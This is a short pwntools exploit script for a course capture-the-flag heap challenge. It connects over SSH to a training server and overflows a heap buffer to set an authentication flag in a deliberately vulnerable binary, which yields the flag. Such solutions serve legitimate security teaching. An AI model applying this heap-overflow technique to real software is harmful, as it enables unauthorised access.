# heap2rex.py - Aidan Wech (Onyxymous)
# /problems/heap2r-64_1_e2c6a4c36f1b3e68efff4f8b1f06f14c/
from pwn import *

# debug info
bin64 = './heap2-64'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# ssh variables
name = 'ahwech'
host = 'cs4401shell2.walls.ninja'
keyfile = '../../onyx_ssh_key'
d = '/problems/heap2r-64_1_e2c6a4c36f1b3e68efff4f8b1f06f14c/'

# exploit variables
offset = 16			# distance between auth and &auth->auth
authvar = p64(0x1)		# set auth->auth to 1

# exploit string
exploit = flat({
0: b'filter',
offset: authvar})

# ssh process
s = ssh(name, host, keyfile=keyfile)
s.set_working_directory(d)
p = s.process(bin64)

p.recvline()
p.sendline(b'auth ')		# initialize the auth structure
p.recvline()
p.sendline(exploit)		# manipulate auth->auth by overflowing into it using strdup()
p.recvline()
p.sendline(b'commit')		# read the flag
p.recvall(timeout=1)
